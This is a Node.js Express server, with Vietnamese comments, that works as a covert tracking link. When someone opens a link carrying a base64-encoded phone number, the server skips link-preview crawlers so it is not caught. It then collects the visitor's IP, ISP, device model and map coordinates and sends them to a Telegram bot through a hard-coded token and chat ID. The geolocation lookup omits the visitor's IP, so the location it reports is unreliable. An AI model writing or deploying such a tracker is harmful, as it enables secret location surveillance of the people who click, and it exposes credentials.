const express = require('express');
const axios = require('axios');
const UAParser = require('ua-parser-js');

const app = express();
const PORT = 3000;

// Token Telegram & danh sách chat_id
const TELEGRAM_TOKEN = '7903084653:AAFzYR7ZWNK7Zq_elua_tB1fksolyTtzoK8';
const CHAT_IDS = [
  '5085998678', // bạn
//   '6284672384'
  // '1234567890', // đối tác khác nếu cần
];

// Bộ nhớ tạm để chống spam IP
const recentIPs = new Map();

// Hàm kiểm tra IP truy cập quá nhanh
function isSpam(ip) {
  const now = Date.now();
  const last = recentIPs.get(ip) || 0;
  recentIPs.set(ip, now);
  return (now - last) < 3000; // dưới 3 giây coi là spam
}

app.get('/', async (req, res) => {
  // 🛡️ Kiểm tra User-Agent để chặn bot/trình duyệt preview link (Zalo, Facebook...)
  const userAgent = req.headers['user-agent'] || '';
  const isBot = /bot|crawl|spider|facebook|whatsapp|telegram|twitter/i.test(userAgent);
  if (isBot) {
    return res.send('<pre>🤖 Bot hoặc hệ thống kiểm tra link – không xử lý.</pre>');
  }

  // 🧠 Giải mã UID từ base64 (nếu có)
  let uidRaw = req.query.uid || '';
  let uid = 'Không có UID';
  try {
    const decodedBase64 = decodeURIComponent(uidRaw);
    uid = Buffer.from(decodedBase64, 'base64').toString('utf-8');
  } catch (err) {
    console.warn('⚠️ UID không hợp lệ hoặc không thể giải mã:', err.message);
  }

  // 🧱 Chống spam IP
  const ipCheck = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  if (isSpam(ipCheck)) {
    return res.send('<pre>⚠️ Bạn đang truy cập quá nhanh. Vui lòng chờ giây lát.</pre>');
  }

  const port = req.socket.remotePort;
  const time = new Date().toISOString().replace('T', ' ').split('.')[0];

  // 📱 Phân tích thiết bị
  const parser = new UAParser(userAgent);
  const device = parser.getDevice();
  const phone = device.model ? `${device.vendor || ''} ${device.model}`.trim() : 'PC / Laptop';

  try {
    // 🌍 Lấy thông tin IP từ ip-api
    const ipInfo = await axios.get(`http://ip-api.com/json/`);
    const ip = ipInfo.data.query || 'Unknown';
    const isp = ipInfo.data.isp || 'Unknown';
    const country = ipInfo.data.country || 'Unknown';
    const city = ipInfo.data.city || 'Unknown';
    const zip = ipInfo.data.zip || 'Unknown';
    const lat = ipInfo.data.lat || 'Unknown';
    const lon = ipInfo.data.lon || 'Unknown';
    const timezone = ipInfo.data.timezone || 'Unknown';

    // 📝 Nội dung gửi Telegram
    const output = `
📥 *New Visitor From ZNS*
📞 UID (SĐT): *${uid}*
🌟 IP: \`${ip}\` - port: \`${port}\`
🌐 ISP: *${isp}*
📱 Device: *${phone}*
📍 Location: ${city}, ${country} (${zip})
📌 Lat/Lon: [${lat}, ${lon}](https://maps.google.com/?q=${lat},${lon})
🕒 Time: ${time} (${timezone})
    `.trim();

    // 🚀 Gửi thông tin đến tất cả chat_id
    for (const chatId of CHAT_IDS) {
      try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: output,
          parse_mode: 'Markdown'
        });
        console.log(`✅ Gửi thành công đến chat_id: ${chatId}`);
      } catch (sendErr) {
        console.error(`❌ Lỗi gửi đến chat_id: ${chatId} - ${sendErr.message}`);
      }
    }

    res.send(`<pre>✅ Đã gửi thông tin cho ${CHAT_IDS.length} người trên Telegram!</pre>`);
  } catch (err) {
    console.error(`❌ Lỗi lấy thông tin IP: ${err.message}`);
    res.status(500).send('❌ Lỗi khi truy xuất hoặc gửi dữ liệu');
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server đang chạy tại http://localhost:${PORT}`);
});


// https://api.telegram.org/bot7903084653:AAFzYR7ZWNK7Zq_elua_tB1fksolyTtzoK8/getUpdates